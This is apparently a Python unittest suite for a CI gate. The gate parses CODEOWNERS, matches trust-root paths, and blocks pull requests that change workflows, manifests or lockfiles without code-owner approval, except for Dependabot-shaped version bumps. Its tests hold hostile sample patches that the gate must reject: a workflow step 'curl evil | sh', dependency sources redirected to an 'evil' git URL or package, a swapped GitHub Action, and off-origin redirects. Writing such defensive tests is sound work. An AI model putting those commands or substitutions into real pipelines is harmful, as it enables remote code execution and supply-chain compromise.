#!/usr/bin/env python3
"""Refusal proofs for `trust_roots.py`: the CODEOWNERS subset parser, the path
matcher, and the `trust-root-diff` merge decision.

Every input the parser must refuse and every PR shape the decision must fail
gets its own test (PRINCIPLES.md "Prove the refusals"); positive cases pin the
paths that must pass and run the live `.github/CODEOWNERS` through the parser.

Pure stdlib `unittest`, no network.
"""

from __future__ import annotations

import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import trust_roots as tr  # noqa: E402

HEAD = "a" * 40
OTHER = "b" * 40


def _roots(text: str) -> tr.TrustRoots:
    return tr.parse_codeowners(text)


class ParserRefusals(unittest.TestCase):
    def assertRefused(self, text: str, needle: str) -> None:
        with self.assertRaises(tr.CodeownersError) as cm:
            tr.parse_codeowners(text)
        self.assertIn(needle, str(cm.exception))

    def test_empty_file_is_refused(self) -> None:
        self.assertRefused("# only a comment\n\n", "no rules")

    def test_ownerless_rule_is_refused(self) -> None:
        self.assertRefused("/.github/ @owner\n/.github/ci/\n", "has no owner")

    def test_differing_owner_sets_are_refused(self) -> None:
        self.assertRefused("/.github/ @owner\n/tools/ @other\n", "one owner set")

    def test_team_owner_is_refused(self) -> None:
        self.assertRefused("/.github/ @org/team\n", "not an `@login`")

    def test_email_owner_is_refused(self) -> None:
        self.assertRefused("/.github/ owner@example.com\n", "not an `@login`")

    def test_inline_comment_is_refused(self) -> None:
        self.assertRefused("/.github/ @owner # trailing\n", "inline `#`")

    def test_negation_is_refused(self) -> None:
        self.assertRefused("!/.github/ @owner\n", "unsupported")

    def test_bracket_class_is_refused(self) -> None:
        self.assertRefused("/[Cc]argo.toml @owner\n", "unsupported")

    def test_backslash_escape_is_refused(self) -> None:
        self.assertRefused("/a\\ b @owner\n", "unsupported")

    def test_inner_double_star_is_refused(self) -> None:
        self.assertRefused("/src/**/build.rs @owner\n", "final `/**`")

    def test_unanchored_slash_pattern_is_refused(self) -> None:
        self.assertRefused("src/build.rs @owner\n", "does not start with `/`")

    def test_dot_dot_component_is_refused(self) -> None:
        self.assertRefused("/src/../tools/ @owner\n", "component")

    def test_empty_component_is_refused(self) -> None:
        self.assertRefused("/src//tools/ @owner\n", "component")

    def test_non_ascii_rule_is_refused(self) -> None:
        # U+00A0 is whitespace to `str.split()` but not to GitHub.
        self.assertRefused("/.github/\u00a0@owner\n", "printable ASCII")

    def test_unicode_line_separator_in_rule_is_refused(self) -> None:
        # U+2028 is a line break to `str.splitlines()` but not to GitHub.
        self.assertRefused("/.github/ @owner\u2028/tools/ @owner\n", "printable ASCII")

    def test_bare_carriage_return_is_refused(self) -> None:
        self.assertRefused("/.github/ @owner\r/tools/ @owner\n", "bare carriage return")

    def test_non_ascii_comment_and_crlf_are_accepted(self) -> None:
        r = tr.parse_codeowners("# trust roots \u2014 owned\r\n/.github/ @owner\r\n")
        self.assertTrue(r.is_trust_root(".github/x"))

    def test_oversize_file_is_refused(self) -> None:
        self.assertRefused("#" * (tr.MAX_CODEOWNERS_BYTES + 1), "exceeds")


class Matcher(unittest.TestCase):
    def test_anchored_directory(self) -> None:
        r = _roots("/.github/ @owner\n")
        self.assertTrue(r.is_trust_root(".github/workflows/ci.yml"))
        self.assertTrue(r.is_trust_root(".github/CODEOWNERS"))
        self.assertFalse(r.is_trust_root(".github"))  # a file named .github is not the directory
        self.assertFalse(r.is_trust_root("src/.github/x"))
        self.assertFalse(r.is_trust_root(".githubx/y"))

    def test_double_star_suffix_is_directory(self) -> None:
        r = _roots("/.config/** @owner\n")
        self.assertTrue(r.is_trust_root(".config/nextest.toml"))
        self.assertFalse(r.is_trust_root(".config"))

    def test_unanchored_name_matches_at_any_depth(self) -> None:
        r = _roots("Cargo.toml @owner\n.cargo @owner\n")
        self.assertTrue(r.is_trust_root("Cargo.toml"))
        self.assertTrue(r.is_trust_root("src/runtime/rust/Cargo.toml"))
        self.assertTrue(r.is_trust_root("editors/zed-ipe/.cargo/config.toml"))
        self.assertFalse(r.is_trust_root("src/Cargo.toml.bak"))

    def test_star_stays_within_component(self) -> None:
        r = _roots("/src/ipe-cli/tests/g_*/ @owner\nrust-toolchain* @owner\n")
        self.assertTrue(r.is_trust_root("src/ipe-cli/tests/g_db/x.rs"))
        self.assertFalse(r.is_trust_root("src/ipe-cli/tests/g_db"))
        self.assertFalse(r.is_trust_root("src/ipe-cli/tests/golden_x.rs"))
        self.assertTrue(r.is_trust_root("rust-toolchain.toml"))
        self.assertTrue(r.is_trust_root("rust-toolchain"))

    def test_anchored_file(self) -> None:
        r = _roots("/deny.toml @owner\n")
        self.assertTrue(r.is_trust_root("deny.toml"))
        self.assertFalse(r.is_trust_root("sub/deny.toml"))

    def test_case_sensitive(self) -> None:
        r = _roots("/.github/ @owner\n")
        self.assertFalse(r.is_trust_root(".GitHub/workflows/ci.yml"))

    def test_live_codeowners_parses_and_owns_its_roots(self) -> None:
        r = tr.load_codeowners(os.path.join(os.path.dirname(HERE), "CODEOWNERS"))
        for p in (
            ".github/workflows/ci.yml",
            ".github/CODEOWNERS",
            ".github/ci/trust_roots.py",
            ".config/nextest.toml",
            "tools/scripts/ci/x.sh",
            "Cargo.toml",
            "Cargo.lock",
            "src/runtime/rust/build.rs",
            ".cargo/config.toml",
            "rust-toolchain.toml",
            "deny.toml",
        ):
            self.assertTrue(r.is_trust_root(p), p)
        self.assertFalse(r.is_trust_root("src/compiler/parse/src/lib.rs"))


def _pr(
    *,
    outside: bool = True,
    changed: int = 1,
    head: str = HEAD,
    state: str = "open",
    login: str = "someone",
    kind: str = "User",
) -> dict:
    return {
        "state": state,
        "user": {"login": login, "type": kind},
        "changed_files": changed,
        "head": {"sha": head, "repo": {"id": 2 if outside else 1}},
        "base": {"repo": {"id": 1}},
    }


def _review(login: str, state: str, commit: str = HEAD) -> dict:
    return {"user": {"login": login}, "state": state, "commit_id": commit}


ROOTS = "/.github/ @Owner\nCargo.toml @Owner\n"


class Decision(unittest.TestCase):
    def setUp(self) -> None:
        self.roots = _roots(ROOTS)

    def refused(self, pr: dict, files: list, reviews: list, needle: str) -> None:
        with self.assertRaises(tr.Refused) as cm:
            tr.decide(self.roots, pr, files, reviews)
        self.assertIn(needle, str(cm.exception))

    def test_fork_touching_trust_root_without_review_fails(self) -> None:
        self.refused(_pr(), [{"filename": ".github/workflows/ci.yml"}], [], "without a code owner")

    def test_rename_out_of_trust_root_counts(self) -> None:
        files = [{"filename": "docs/ci.yml", "previous_filename": ".github/workflows/ci.yml"}]
        self.refused(_pr(), files, [], "without a code owner")

    def test_approval_of_older_commit_fails(self) -> None:
        self.refused(_pr(), [{"filename": "Cargo.toml"}], [_review("owner", "APPROVED", OTHER)], "without")

    def test_non_owner_approval_fails(self) -> None:
        self.refused(_pr(), [{"filename": "Cargo.toml"}], [_review("someone", "APPROVED")], "without")

    def test_dismissed_approval_fails(self) -> None:
        reviews = [_review("owner", "APPROVED"), _review("owner", "DISMISSED")]
        self.refused(_pr(), [{"filename": "Cargo.toml"}], reviews, "without")

    def test_changes_requested_after_approval_fails(self) -> None:
        reviews = [_review("owner", "APPROVED"), _review("owner", "CHANGES_REQUESTED")]
        self.refused(_pr(), [{"filename": "Cargo.toml"}], reviews, "without")

    def test_deleted_head_repo_counts_as_outside(self) -> None:
        pr = _pr()
        pr["head"]["repo"] = None
        self.refused(pr, [{"filename": "Cargo.toml"}], [], "without")

    def test_truncated_file_list_fails_closed(self) -> None:
        self.refused(_pr(changed=2), [{"filename": "README.md"}], [], "API listed 1 files")

    def test_file_count_past_api_ceiling_fails_closed(self) -> None:
        self.refused(_pr(changed=tr.MAX_PR_FILES + 1), [], [], "at most")

    def test_malformed_head_sha_fails_closed(self) -> None:
        self.refused(_pr(head="HEAD"), [{"filename": "README.md"}], [], "40-hex")

    def test_closed_pr_fails(self) -> None:
        self.refused(_pr(state="closed"), [{"filename": "README.md"}], [], "not open")

    def test_missing_field_fails_closed(self) -> None:
        pr = _pr()
        del pr["changed_files"]
        self.refused(pr, [{"filename": "README.md"}], [], "changed_files")

    def test_deleted_account_review_is_skipped(self) -> None:
        reviews = [{"user": None, "state": "CHANGES_REQUESTED", "commit_id": HEAD}, _review("owner", "APPROVED")]
        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))

    def test_deleted_account_approval_does_not_count(self) -> None:
        reviews = [{"user": None, "state": "APPROVED", "commit_id": HEAD}]
        self.refused(_pr(), [{"filename": "Cargo.toml"}], reviews, "without")

    def test_fork_with_owner_approval_at_head_passes(self) -> None:
        reviews = [_review("OWNER", "CHANGES_REQUESTED", OTHER), _review("owner", "COMMENTED"), _review("owner", "APPROVED")]
        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))

    def test_later_comment_keeps_approval(self) -> None:
        reviews = [_review("owner", "APPROVED"), _review("owner", "COMMENTED", OTHER)]
        self.assertIn("approved", tr.decide(self.roots, _pr(), [{"filename": "Cargo.toml"}], reviews))

    def test_fork_not_touching_trust_root_passes(self) -> None:
        self.assertIn("no trust root", tr.decide(self.roots, _pr(), [{"filename": "src/x.rs"}], []))

    def test_same_repo_branch_of_non_owner_fails(self) -> None:
        self.refused(_pr(outside=False), [{"filename": "Cargo.toml"}], [], "without a code owner")

    def test_same_repo_branch_of_owner_passes(self) -> None:
        out = tr.decide(self.roots, _pr(outside=False, login="Owner"), [{"filename": "Cargo.toml"}], [])
        self.assertIn("code owner Owner", out)

    def test_owner_from_fork_still_needs_approval(self) -> None:
        self.refused(_pr(login="owner"), [{"filename": "Cargo.toml"}], [], "without a code owner")

    def test_bot_named_like_owner_is_not_owner(self) -> None:
        self.refused(_pr(outside=False, login="owner", kind="Bot"), [{"filename": "Cargo.toml"}], [], "without")

    def test_missing_author_fails_closed(self) -> None:
        pr = _pr(outside=False)
        del pr["user"]
        self.refused(pr, [{"filename": "Cargo.toml"}], [], "user.login")

    def test_malformed_author_fails_closed(self) -> None:
        for login, kind in [("", "User"), ("a b", "User"), (None, "User"), ("owner", None)]:
            pr = _pr(outside=False, login="x")
            pr["user"] = {"login": login, "type": kind}
            self.refused(pr, [{"filename": "Cargo.toml"}], [], "malformed")

    def test_untouched_trust_roots_ignore_author(self) -> None:
        pr = _pr(outside=False)
        pr["user"] = None
        self.assertIn("no trust root", tr.decide(self.roots, pr, [{"filename": "src/x.rs"}], []))


LOCK_BUMP = """@@ -10,7 +10,7 @@
 [[package]]
 name = "toml_edit"
-version = "0.22.27"
+version = "0.25.1"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "%s"
+checksum = "%s"
 dependencies = [
""" % ("1" * 64, "2" * 64)
MANIFEST_BUMP = '@@ -3,3 +3,3 @@\n [dependencies]\n-toml_edit = "0.22"\n+toml_edit = "0.25"\n serde = "1"'
PIN = "actions/download-artifact@" + "b" * 40 + " # v7"
PIN_BUMP = "@@ -9,3 +9,3 @@\n steps:\n-      - uses: %s\n+      - uses: %s\n" % (
    PIN,
    "actions/download-artifact@" + "c" * 40 + " # v8.0.1",
)


def _bot_pr(changed: int = 1) -> dict:
    return _pr(outside=False, changed=changed, login="dependabot[bot]", kind="Bot")


class DependabotBump(unittest.TestCase):
    """Dependabot passes without review only for a diff shaped like a version
    bump; every other edit it (or a push onto its branch) makes needs the
    code owner, as any other author's does."""

    def setUp(self) -> None:
        self.roots = _roots("/.github/ @Owner\nCargo.toml @Owner\nCargo.lock @Owner\n")

    def passes(self, files: list) -> None:
        self.assertIn("Dependabot", tr.decide(self.roots, _bot_pr(len(files)), files, []))

    def refused(self, files: list, pr: dict | None = None) -> None:
        with self.assertRaises(tr.Refused) as cm:
            tr.decide(self.roots, pr or _bot_pr(), files, [])
        self.assertIn("without a code owner", str(cm.exception))

    def test_manifest_and_lock_bump_passes(self) -> None:
        self.passes(
            [
                {"filename": "src/ipe-cli/Cargo.toml", "patch": MANIFEST_BUMP},
                {"filename": "Cargo.lock", "patch": LOCK_BUMP},
            ]
        )

    def test_inline_table_version_bump_passes(self) -> None:
        patch = '@@ -1 +1 @@\n-serde = { version = "1.0.1", features = ["derive"] }\n+serde = { version = "1.0.2", features = ["derive"] }'
        self.passes([{"filename": "Cargo.toml", "patch": patch}])

    def test_action_pin_bump_passes(self) -> None:
        self.passes([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}])

    def test_other_bot_is_not_dependabot(self) -> None:
        pr = _pr(outside=False, login="renovate[bot]", kind="Bot")
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)

    def test_user_named_dependabot_is_not_dependabot(self) -> None:
        pr = _pr(outside=False, login="dependabot[bot]", kind="User")
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)

    def test_dependabot_from_fork_is_not_trusted(self) -> None:
        pr = _pr(outside=True, login="dependabot[bot]", kind="Bot")
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}], pr)

    def test_missing_patch_fails(self) -> None:
        self.refused([{"filename": "Cargo.lock"}])

    def test_non_manifest_trust_root_fails(self) -> None:
        patch = "@@ -1 +1 @@\n-* @Owner\n+* @someone"
        self.refused([{"filename": ".github/CODEOWNERS", "patch": patch}])

    def test_workflow_edit_that_is_not_a_pin_fails(self) -> None:
        patch = "@@ -1 +1 @@\n-      run: cargo test\n+      run: curl evil | sh"
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])

    def test_workflow_action_swap_fails(self) -> None:
        patch = "@@ -1 +1 @@\n-      - uses: %s\n+      - uses: %s" % (PIN, "evil/download-artifact@" + "c" * 40)
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])

    def test_workflow_unpinned_action_fails(self) -> None:
        patch = "@@ -1 +1 @@\n-      - uses: %s\n+      - uses: actions/download-artifact@v8" % PIN
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])

    def test_workflow_added_step_fails(self) -> None:
        patch = "@@ -1 +1,2 @@\n-      - uses: %s\n+      - uses: %s\n+      - uses: %s" % (PIN, PIN, PIN)
        self.refused([{"filename": ".github/workflows/ci.yml", "patch": patch}])

    def test_nested_workflow_path_fails(self) -> None:
        self.refused([{"filename": ".github/workflows/sub/ci.yml", "patch": PIN_BUMP}])

    def test_manifest_source_change_fails(self) -> None:
        for new in [
            'toml_edit = { git = "https://evil/x", version = "0.25" }',
            'toml_edit = { path = "../x", version = "0.25" }',
            'toml_edit = { version = "0.25", package = "evil" }',
            'toml_edit = { version = "0.25", registry = "evil" }',
        ]:
            patch = '@@ -1 +1 @@\n-toml_edit = { version = "0.22" }\n+' + new
            self.refused([{"filename": "Cargo.toml", "patch": patch}])

    def test_manifest_build_script_fails(self) -> None:
        patch = '@@ -1 +1 @@\n-build = "a.rs"\n+build = "b.rs"'
        self.refused([{"filename": "Cargo.toml", "patch": patch}])

    def test_manifest_feature_change_fails(self) -> None:
        patch = '@@ -1 +1 @@\n-serde = { version = "1", features = ["a"] }\n+serde = { version = "2", features = ["b"] }'
        self.refused([{"filename": "Cargo.toml", "patch": patch}])

    def test_manifest_digit_feature_swap_fails(self) -> None:
        patch = '@@ -1 +1 @@\n-serde = { version = "1", features = ["2018"] }\n+serde = { version = "1", features = ["2021"] }'
        self.refused([{"filename": "Cargo.toml", "patch": patch}])

    def test_manifest_added_dependency_fails(self) -> None:
        patch = '@@ -1 +1,2 @@\n serde = "1"\n+evil = "1"'
        self.refused([{"filename": "Cargo.toml", "patch": patch}])

    def test_lock_non_crates_io_source_fails(self) -> None:
        patch = '@@ -1 +1 @@\n-source = "registry+https://github.com/rust-lang/crates.io-index"\n+source = "git+https://evil/x#abc"'
        self.refused([{"filename": "Cargo.lock", "patch": patch}])

    def test_rename_away_from_trust_root_fails(self) -> None:
        files = [{"filename": "docs/ci.yml", "previous_filename": ".github/workflows/ci.yml", "patch": PIN_BUMP}]
        self.refused(files)


class EventRouting(unittest.TestCase):
    def test_pull_request_target(self) -> None:
        ev = {"pull_request": {"number": 7, "head": {"sha": HEAD}}}
        self.assertEqual(tr.pr_number_for_event("pull_request_target", ev), (7, HEAD))

    def test_merge_group(self) -> None:
        ev = {"merge_group": {"head_ref": f"refs/heads/gh-readonly-queue/main/pr-3134-{HEAD}"}}
        self.assertEqual(tr.pr_number_for_event("merge_group", ev), (3134, None))

    def test_unparseable_queue_ref_fails_closed(self) -> None:
        for ref in (
            "refs/heads/main",
            f"refs/heads/gh-readonly-queue/main/pr-0-{HEAD}",
            "refs/heads/gh-readonly-queue/main/pr-12-abc",
            None,
        ):
            with self.assertRaises(tr.Refused):
                tr.pr_number_for_event("merge_group", {"merge_group": {"head_ref": ref}})

    def test_other_event_is_refused(self) -> None:
        for name in ("pull_request", "push", "pull_request_review"):
            with self.assertRaises(tr.Refused):
                tr.pr_number_for_event(name, {"pull_request": {"number": 1, "head": {"sha": HEAD}}})

    def test_moved_head_fails_closed(self) -> None:
        class FakeApi:
            def get(self, path: str) -> dict:
                return _pr(head=OTHER)

            def get_all(self, path: str) -> list:
                return []

        ev = {"pull_request": {"number": 7, "head": {"sha": HEAD}}}
        with self.assertRaises(tr.Refused) as cm:
            tr.run_check(_roots(ROOTS), "pull_request_target", ev, FakeApi())  # type: ignore[arg-type]
        self.assertIn("moved", str(cm.exception))

    def test_head_moved_while_reading_fails_closed(self) -> None:
        class FakeApi:
            calls = 0

            def get(self, path: str) -> dict:
                FakeApi.calls += 1
                return _pr(head=HEAD if FakeApi.calls == 1 else OTHER)

            def get_all(self, path: str) -> list:
                return [{"filename": "Cargo.toml"}] if path.endswith("files") else [_review("owner", "APPROVED")]

        ev = {"pull_request": {"number": 7, "head": {"sha": HEAD}}}
        with self.assertRaises(tr.Refused) as cm:
            tr.run_check(_roots(ROOTS), "pull_request_target", ev, FakeApi())  # type: ignore[arg-type]
        self.assertIn("while it was read", str(cm.exception))


class ApiGuards(unittest.TestCase):
    def test_non_https_base_is_refused(self) -> None:
        with self.assertRaises(tr.Refused):
            tr.Api("http://api.github.com", "o/r", "t")

    def test_malformed_repo_is_refused(self) -> None:
        with self.assertRaises(tr.Refused):
            tr.Api("https://api.github.com", "o/r/../x", "t")

    def test_off_origin_redirect_is_refused(self) -> None:
        import urllib.request

        h = tr._PinnedRedirects("https://api.github.com")
        req = urllib.request.Request("https://api.github.com/repos/o/r/pulls/1", headers={"Authorization": "Bearer t"})
        for url in ("https://evil.example/x", "https://api.github.com.evil.example/x", "http://api.github.com/x"):
            with self.assertRaises(tr.Refused) as cm:
                h.redirect_request(req, None, 301, "Moved", {}, url)
            self.assertIn("off the API origin", str(cm.exception))
        self.assertIsNotNone(h.redirect_request(req, None, 301, "Moved", {}, "https://api.github.com/repositories/1/pulls/1"))

    def test_off_origin_link_is_refused_before_any_request(self) -> None:
        api = tr.Api("https://api.github.com", "o/r", "t")
        with self.assertRaises(tr.Refused) as cm:
            api._get("https://evil.example/repos/o/r/pulls")
        self.assertIn("off the API origin", str(cm.exception))


if __name__ == "__main__":
    unittest.main()
